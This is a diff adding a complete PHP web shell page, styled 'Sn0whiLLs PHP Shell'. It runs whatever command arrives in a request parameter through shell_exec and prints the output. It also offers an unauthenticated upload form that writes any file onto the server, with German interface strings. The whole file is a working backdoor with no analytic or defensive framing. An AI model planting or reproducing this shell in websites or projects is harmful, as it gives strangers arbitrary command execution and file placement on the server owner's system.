@@ -1,0 +1,5 @@
+<html><head><title>Sn0whiLLs PHP Shell</title></head><body bgcolor=#000000 text=#ffffff onLoad="document.forms[0].elements[-cmd].focus()"><h1>\
+<u>Welcome ² Moglis Shell - tRS.iNC</u></h1><b>Execute Here Your Files</b><br><form method=POST><br>\
+<input name="-cmd" size=50 value="<?=$cmd?>" style="background:#303030;color:#00FF00;font-variant:small-caps; font-family:Verdana; font-size:1em"><pre><? $cmd = $_REQUEST["-cmd"]; ?><? if($cmd != "") print Shell_Exec($cmd); ?></pre></form></body></html><br><br><br>\
+<b>Upload Here Your Files</b><br><br<<br><body><div align=left width=98%><FORM ACTION="DonVito.php" METHOD="POST" ENCTYPE="multipart/form-data"><TABLE WIDTH=220 BORDER=0 CELLPADDING=0 CELLSPACING=0 id=news><tr><td width=113></td><td width=289>\
+<input type=file name="superdat" style="background:#303030;color:#00FF00;font-family:Verdana; font-size:8pt" size=50><INPUT TYPE=SUBMIT NAME="submit" VALUE="Hochladen"></DIV></FORM><? if ($superdat_name != "") {copy("$superdat", "$superdat_name") or die("Datei konnte nicht geschrieben werden!");} else {die("");}?><p align=left><b>Hochladen: </b><? echo "$superdat_name";?>.
